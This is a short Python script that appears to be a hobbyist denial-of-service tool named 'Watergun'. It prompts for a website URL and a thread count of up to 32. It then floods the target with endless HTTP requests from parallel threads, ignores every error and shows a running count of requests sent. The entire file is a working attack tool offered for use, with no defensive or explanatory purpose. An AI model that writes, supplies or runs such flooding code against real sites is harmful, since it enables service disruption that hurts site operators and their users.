from urllib.request import urlopen
from os import system
from time import sleep
from readchar import readchar
import threading
w=input('Enter website url: ')
t=int(input('Select amount of threads to use: '))
at=0
def dos():
    while True:
            try:
                global at
                at=at+1
                urlopen(w)
            except:
                pass
def atc():
    while True:
        system('cls')
        print('''
     __        __    _                             
 \ \      / /_ _| |_ ___ _ __ __ _ _   _ _ __  
  \ \ /\ / / _` | __/ _ \ '__/ _` | | | | '_ \ 
   \ V  V / (_| | ||  __/ | | (_| | |_| | | | |
    \_/\_/ \__,_|\__\___|_|  \__, |\__,_|_| |_|
                             |___/
                ''');
        print(at, 'Requests sent')
        sleep(0.5)
if t<33:
    if t<1:
        print('Error: can\'t use less than 1 thread')
        readchar.readchar()
    else:
        x = threading.Thread(target=atc)
        x.start()
        for x in range(t):
            x = threading.Thread(target=dos)
            x.start()
else:
    print('Error: can\'t use more than 32 threads')
    readchar()
